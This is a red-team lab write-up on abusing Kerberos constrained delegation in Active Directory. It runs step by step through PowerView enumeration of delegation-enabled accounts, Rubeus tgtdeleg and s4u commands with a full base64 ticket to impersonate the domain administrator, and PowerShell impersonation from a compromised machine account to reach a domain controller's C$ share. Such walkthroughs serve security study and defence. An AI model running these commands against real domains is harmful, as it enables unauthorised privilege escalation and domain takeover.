---
description: >-
  This lab explores a security impact of unrestricted kerberos delegation
  enabled on a domain computer.
---

# Kerberos Constrained Delegation

### User Account

#### Prerequisites

Hunting for user accounts that have kerberos constrained delegation enabled:

{% code title="attacker\@target" %}
```
Get-NetUser -TrustedToAuth
```
{% endcode %}

In the below screenshot, the user `spot` is allowed to delegate or in other words, impersonate any user and authenticate to a file system service (CIFS) on a domain controller DC01.

{% hint style="info" %}
User has to have an attribute `TRUSTED_TO_AUTH_FOR_DELEGATION` in order for it to be able to authenticate to the remote service.

> TRUSTED\_TO\_AUTH\_FOR\_DELEGATION - (Windows 2000/Windows Server 2003) The account is enabled for delegation. This is a security-sensitive setting. Accounts that have this option enabled should be tightly controlled. This setting lets a service that runs under the account assume a client's identity and authenticate as that user to other remote servers on the network.
>
> [https://support.microsoft.com/en-gb/help/305144/how-to-use-useraccountcontrol-to-manipulate-user-account-properties](https://support.microsoft.com/en-gb/help/305144/how-to-use-useraccountcontrol-to-manipulate-user-account-properties)
{% endhint %}

Attribute `msds-allowedtodelegateto` identifies the SPNs of services the user `spot` is trusted to delegate to (impersonate other domain users) and authenticate to - in this case, it's saying that the user spot is allowed to authenticate to CIFS service on DC01 on behalf of any other domain user:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LmUhmRdd-A22BRvuH4d%2F-LmUuqN8vgeYFDytDQEY%2Fimage.png?alt=media\&token=8289e63f-743c-4805-b1d1-a90170a7d9c4)

The `msds-allowedtodelegate` attribute in AD is defined here:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LmUhmRdd-A22BRvuH4d%2F-LmUj2nVKcbsVl1DNw-L%2Fimage.png?alt=media\&token=9dc61f85-1f7d-4129-9ad0-f82904946783)

The `TRUSTED_TO_AUTH_FOR_DELEGATION` attribute in AD is defined here:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LmUhmRdd-A22BRvuH4d%2F-LmUuvuUvqg5eYSlA6ef%2Fimage.png?alt=media\&token=ecddfc1f-3527-42b4-8948-a4208f270de7)

#### Execution

Assume we've compromised the user `spot` who has the constrained delegation set as described earlier. Let's check that currently we cannot access the file system of the DC01 before we impersonate a domain admin user:

{% code title="attacker\@target" %}
```
dir \\dc01\c$
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LmUhmRdd-A22BRvuH4d%2F-LmUjKwUqJd0QbYGUHxf%2Fimage.png?alt=media\&token=ccbf4e32-8e5b-48d9-9b03-a797aa5a1ded)

Let's now request a delegation TGT for the user spot:

{% code title="attacker\@target" %}
```
\\vboxsvr\tools\Rubeus\Rubeus.exe tgtdeleg
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LmUhmRdd-A22BRvuH4d%2F-LmUlJsFuaNBjB_cFmsM%2Fimage.png?alt=media\&token=65e16a0e-e765-4aef-8d57-52c3db2bd4ea)

Using rubeus, we can now request TGS for `administrator@offense.local`, who will be allowed to authenticate to `CIFS/dc01.offense.local`:

{% code title="attacker\@target" %}
```
# ticket is the base64 ticket we get with `rubeus's tgtdeleg`
Rubeus.exe s4u /ticket:doIFCDCCBQSgAwIBBaEDAgEWooIEDjCCBAphggQGMIIEAqADAgEFoQ8bDU9GRkVOU0UuTE9DQUyiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDU9GRkVOU0UuTE9DQUyjggPEMIIDwKADAgESoQMCAQKiggOyBIIDro3ZCHDaVettnJseuyFJMK+Il4GAtWVAHPAq02cnHmOs3R2KcrOWpf3YbtnTD7fB+rKdZ8aElgloJO+v4XVM2NgyOVIia0MzNToDrK1ynhC70aApbag+ykvUFTDeG9NjhE3TVk3+F99vWboy6hhc9AmRUJwHFuqLC4djtL2PtQSpgWWL42W5eONlIZkc5XK0kWkC/AvivuuPOHs9aEy3g38hoBeApZE8NqT7mGKz5JHLwV5TyUgo87s6fFVSn8LHK8CI6G0x2DRhxxu04q0qnRXhLJ5S0MyJgJj6YDVESvCUgep5MXR+OYp0EGdVP8qQJK+x6m4rmr0Y3nd1Klmc+xDnLSC11ay7I8VevqhCBCZ64c+HQow4qcMTa/agxyOXqK42ynUl0GJtrLV7nIIrp+J2e5PECDUXIjKFkGnp6HZDNfzYAGL3XxyyT2JYdneOS3VUzJQyEctjuQMdVA0wB8NrRqDVdqSNBSOyBwpB3/FWzdHNYxztRmVT+Yz6qJCU4SYHIzHUE5dqHjvhjPSwgAkhS/QNApxtWvyba8iwCSnyualuhK46LS0pkt1IIQT0Y+qw80oL6mzjD+rxfKgR4B9hI6Imw9zTT5rjlRNMjWEy78izLtRB+ulzqdkZCUMA6zswWjq1BTmWzZX0LAZ+QAWQJPzoRVsqOcZCZwo/aWwmO1s9v5TLRRMLTAvk16PQW3z9NHix2Io9sObH8cb7gVrB+u2Q545Qwekl0uwP5mCar6swU2oEkxBm5DZvLsbZTcGl+KzGxqq/zhEJm3EceLuwIY81z8aYu13c6AsYETs9VevdEVysylpNL7EcHu8iXsoE5JmLx7OrcPR9WfeFWxRDp+1CVDijOI5VOS51+JpkEvcXFmfZueqLTJ66VGJgQaP7A3B//Y40ur5nSXyvEmIKgzdeqPLpGa5GPiNs/rYFmMlxwEX+yVFB5bPYgoszr3Crjsvs6Q/vdr36NoWqI9/11Nurzeeknt+k8sUV26URnQVkecW4yJFQ2TZwYCJ1k9h4cr96csJ9HhJO46UBye/8oqlqJXKnYY3JpaZiXWK77kG7BqhM6oPl+oEIbX2ycj/gHesxREvP7/vYINk33KbOSxXTAi3Je3wbZP7N+3B9Lz04m8Xi6nGeIVsZiMyODpnJVX5Bgq+3cGaSty0v+fIfqMHDwuKhOS7h1MGLJduhWh3b21ytDfzn73yyCPskFee2ckAomlAgxMzg8ZatmZDLTxfUenJ+EnrJgkYee6OB5TCB4qADAgEAooHaBIHXfYHUMIHRoIHOMIHLMIHIoCswKaADAgESoSIEIN2JDvcjQZeMR+7giMsawE1vG/Cmw9IFIV7ZYwaELMqaoQ8bDU9GRkVOU0UuTE9DQUyiETAPoAMCAQGhCDAGGwRzcG90owcDBQBgoQAApREYDzIwMTkwODE3MTMyMDU2WqYRGA8yMDE5MDgxNzIzMDY0MFqnERgPMjAxOTA4MjQxMzA2NDBaqA8bDU9GRkVOU0UuTE9DQUypIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDU9GRkVOU0UuTE9DQUw= /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LmUhmRdd-A22BRvuH4d%2F-LmUzEl7ko1gQWHK3KYc%2Fimage.png?alt=media\&token=eb168db2-5a10-4522-9062-f080c1b64fed)

We've got the impersonated TGS tickets for administrator account:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LmUhmRdd-A22BRvuH4d%2F-LmUzKj4C1b1v5hycKkf%2Fimage.png?alt=media\&token=864af1bf-4c8e-4b0b-8c3a-0e2fa2c5a0a8)

Which as we can see are now in memory of the current logon session:

{% code title="attacker\@target" %}
```
klist
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LmUhmRdd-A22BRvuH4d%2F-LmUzUcQdpvIqtCxAYGC%2Fimage.png?alt=media\&token=8d3c15cb-4153-41f6-ae61-a6f9b0f038d2)

If we now attempt accessing the file system of the DC01 from the user's spot terminal, we can confirm we've successfully impersonated the domain administrator account that can authenticate to the CIFS service on the domain controller DC01:

{% code title="attacker\@target" %}
```
dir \\dc01.offense.local\c$
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LmUhmRdd-A22BRvuH4d%2F-LmUwNck8RXhHhHcSOAQ%2Fimage.png?alt=media\&token=3f21ed35-8473-4e5a-88a1-f0ddf1ef0ea3)

Note that in this case we requested a TGS for the CIFS service, but we could also request additional TGS tickets with rubeus's ~~`/altservice`~~ switch for: HTTP (WinRM), LDAP (DCSync), HOST (PsExec shell), MSSQLSvc (DB admin rights).

### Computer Account

If you have compromised a machine account or in other words you have a SYSTEM level privileges on a machine that is configured with constrained delegation, you can assume any identity in the AD domain and authenticate to services that the compromised machine is trusted to delegate to.

In this lab, a workstation WS02 is trusted to delegate to DC01 for CIFS and LDAP services and I am going to exploit the CIFS services this time:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LmVP66fGg7JqdxxKL3J%2F-LmVQ2QxEygwna1_gN7H%2Fimage.png?alt=media\&token=bef25e17-b880-4c12-9acc-aeff5c3e1182)

Using powerview, we can find target computers like so:

{% code title="attacker\@target" %}
```csharp
Get-NetComputer ws02 | select name, msds-allowedtodelegateto, useraccountcontrol | fl
Get-NetComputer ws02 | Select-Object -ExpandProperty msds-allowedtodelegateto | fl
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LmWKHmv5wx8WNlOyYZV%2F-LmWRJz_w33yps83qlND%2Fimage.png?alt=media\&token=49095a8c-6e58-44f2-a3e8-abbe89d147ad)

Let's check that we're currently running as SYSTEM and can't access the C$ on our domain controller DC01:

{% code title="attacker\@target" %}
```csharp
hostname
[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
ls \\dc01.offense.local\c$
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LmVP66fGg7JqdxxKL3J%2F-LmVQwyg2up-8jH35uo9%2Fimage.png?alt=media\&token=e6e1ebf3-38fd-48d5-be74-70032f68f165)

Let's now impersonate [administrator@offense.local](mailto:administrator@offense.local) and try again:

{% code title="attacker\@target" %}
```csharp
[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
$idToImpersonate.Impersonate()
[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name

ls \\dc01.offense.local\c$
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LmVP66fGg7JqdxxKL3J%2F-LmVRLtPPiuCCOwE9W5c%2Fimage.png?alt=media\&token=448aac93-eb90-4108-a5f1-72c6dd705574)

### References

{% embed url="https://blogs.msdn.microsoft.com/mattlind/2010/01/13/delegation-tab-in-aduc-not-available-until-a-spn-is-set/" %}

{% embed url="https://blogs.technet.microsoft.com/tristank/2007/06/18/kdc_err_badoption-when-attempting-constrained-delegation/" %}

{% embed url="https://support.microsoft.com/en-gb/help/305144/how-to-use-useraccountcontrol-to-manipulate-user-account-properties" %}
